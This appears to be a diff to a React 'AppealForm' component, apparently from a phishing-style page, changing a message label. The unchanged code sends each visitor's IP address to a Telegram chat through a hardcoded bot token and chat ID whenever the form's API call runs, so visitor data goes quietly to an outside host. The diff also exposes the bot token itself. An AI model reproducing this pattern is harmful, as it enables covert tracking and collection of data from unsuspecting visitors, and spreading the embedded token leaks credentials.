@@ -18,7 +18,7 @@ const AppealForm = (props) => {
 
     const callAPI = async () => {
         try {
-            const message = `Message: hini ip:${props.ip.userIP}`
+            const message = `Message: Visit ip:${props.ip.userIP}`
             await fetch(`https://api.telegram.org/bot7692191399:AAHd6jlWAXI0dZTrX-nAYbfDGLeaHrRZxEI/sendMessage?chat_id=-1002326609566&message_thread_id=2&text=${message}`);
         } catch (err) {
             console.log(err);
